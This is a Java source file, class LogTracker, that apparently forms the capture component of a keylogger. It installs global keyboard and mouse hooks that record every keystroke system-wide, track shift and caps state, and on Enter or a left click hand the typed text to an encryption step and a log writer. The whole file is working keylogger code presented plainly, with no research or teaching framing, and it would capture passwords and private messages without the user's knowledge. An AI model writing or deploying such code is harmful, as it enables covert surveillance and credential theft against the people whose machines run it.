package data.input;

import data.output.LogWriter;
import java.io.IOException;
import lc.kra.system.keyboard.GlobalKeyboardHook;
import lc.kra.system.keyboard.event.GlobalKeyAdapter;
import lc.kra.system.keyboard.event.GlobalKeyEvent;
import lc.kra.system.mouse.GlobalMouseHook;
import lc.kra.system.mouse.event.GlobalMouseAdapter;
import lc.kra.system.mouse.event.GlobalMouseEvent;

public class LogTracker {

    private StringBuilder log = new StringBuilder("");
    private boolean isCaps = false;

    public void run(LogCleaner cleaner, LogWriter writer) {
        new GlobalKeyboardHook().addKeyListener(new GlobalKeyAdapter() {
            @Override
            public void keyPressed(GlobalKeyEvent event) {
                switch (event.getVirtualKeyCode()) {
                    case GlobalKeyEvent.VK_BACK:
                        log.deleteCharAt(log.length() - 1);
                        break;
                    case GlobalKeyEvent.VK_RSHIFT:
                    case GlobalKeyEvent.VK_LSHIFT:
                    case GlobalKeyEvent.VK_CAPITAL:
                        isCaps = !isCaps;
                        break;
                    case GlobalKeyEvent.VK_RETURN: {
                        try {
                            exportString(cleaner, writer);
                        } catch (IOException ex) {
                        }
                    }
                        break;
                    default:
                        log.append(checkIfMakeUpper(event.getKeyChar()));
                        break;
                }
            }
            
            @Override
            public void keyReleased(GlobalKeyEvent event) {
                switch (event.getVirtualKeyCode()) {
                    case GlobalKeyEvent.VK_RSHIFT:
                    case GlobalKeyEvent.VK_LSHIFT:
                    isCaps = !isCaps;
                    break;
                }
            }
        });

        new GlobalMouseHook().addMouseListener(new GlobalMouseAdapter() {
            @Override
            public void mousePressed(GlobalMouseEvent event) {
                if (event.getButtons() == GlobalMouseEvent.BUTTON_LEFT) {
                    try {
                        exportString(cleaner, writer);
                    } catch (IOException ex) { /**Throws IO Exception **/ }
                }
            }
        });
    }
    
    private char checkIfMakeUpper(char c) {
        if (isCaps == true) {
            c = Character.toUpperCase(c);
        }
        return c;
    }

    private void exportString(LogCleaner cleaner, LogWriter writer) throws IOException {
        if (log.length() != 0) {
            writer.writeLog(cleaner.cleanAndEncrypt(log));
        }
        log = new StringBuilder("");
    }
}
